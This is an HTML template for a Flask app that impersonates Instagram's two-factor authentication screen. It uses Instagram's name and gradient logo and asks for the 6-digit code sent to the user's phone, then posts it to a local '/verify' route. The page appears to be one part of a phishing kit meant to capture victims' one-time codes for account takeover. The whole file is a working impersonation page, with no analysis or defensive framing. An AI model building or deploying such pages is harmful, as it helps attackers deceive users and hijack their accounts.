<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo">
                <svg viewBox="0 0 24 24" width="40" height="40" fill="url(#grad)">
                    <defs>
                        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
                            <stop offset="0%" stop-color="#f09433"/>
                            <stop offset="25%" stop-color="#e6683c"/>
                            <stop offset="50%" stop-color="#dc2743"/>
                            <stop offset="75%" stop-color="#cc2366"/>
                            <stop offset="100%" stop-color="#bc1888"/>
                        </linearGradient>
                    </defs>
                    <rect x="2" y="2" width="20" height="20" rx="5" ry="5" fill="url(#grad)"/>
                    <circle cx="12" cy="12" r="5" fill="none" stroke="white" stroke-width="1.5"/>
                    <circle cx="17.5" cy="6.5" r="1.2" fill="white"/>
                </svg>
                <h1>Instagram</h1>
            </div>

            <div class="twofa-header">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="#0095f6">
                    <path d="M12 1C8.1 1 5 4.1 5 8v3c0 .6.4 1 1 1s1-.4 1-1V8c0-2.8 2.2-5 5-5s5 2.2 5 5v3c0 .6.4 1 1 1s1-.4 1-1V8c0-3.9-3.1-7-7-7z"/>
                    <path d="M5 11v6c0 1.7 1.3 3 3 3h8c1.7 0 3-1.3 3-3v-6H5zm7 7c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
                </svg>
                <h2>Two-Factor Authentication</h2>
                <p>Enter the 6-digit code sent to your phone.</p>
            </div>

            <form method="POST" action="/verify">
                <input type="text" name="code" placeholder="000000" maxlength="6" pattern="[0-9]{6}" required autocomplete="off">
                <button type="submit">Verify</button>
            </form>

            <div class="twofa-options">
                <a href="#">Send code via SMS</a>
                <a href="#">Use backup code</a>
            </div>
        </div>
    </div>
</body>
</html>
